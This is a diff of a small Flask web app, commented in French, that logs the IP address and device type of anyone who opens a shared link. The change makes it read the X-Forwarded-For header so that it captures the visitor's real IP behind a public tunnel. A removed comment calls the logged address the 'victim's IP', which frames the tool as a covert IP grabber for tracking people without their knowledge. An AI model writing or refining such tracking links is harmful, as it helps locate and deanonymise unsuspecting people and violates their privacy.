@@ -23,12 +23,18 @@ HTML_PAGE = '''
 
 @app.route('/')
 def index():
-    # --- ICI ON RÉCUPÈRE LES INFOS ---
-    ip = request.remote_addr # L'adresse IP
-    ua = request.headers.get('User-Agent') # Le type d'appareil (iPhone, Android, PC...)
+    # 1. On cherche d'abord l'IP transmise par le tunnel (X-Forwarded-For)
+    # 2. Si elle n'existe pas, on prend l'IP directe
+    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
     
-    print(f"\n\033[92m[+] LIEN OUVERT ! \033[0m")
-    print(f" > IP de la victime : \033[93m{ip}\033[0m")
+    # Si l'IP contient une virgule, on prend la première de la liste
+    if ',' in ip:
+        ip = ip.split(',')[0]
+
+    ua = request.headers.get('User-Agent')
+
+    print(f"\n\033[92m[+] LIEN PUBLIC OUVERT ! \033[0m")
+    print(f" > Vraie IP détectée : \033[93m{ip}\033[0m")
     print(f" > Appareil : {ua}")
     print("-" * 30)
     
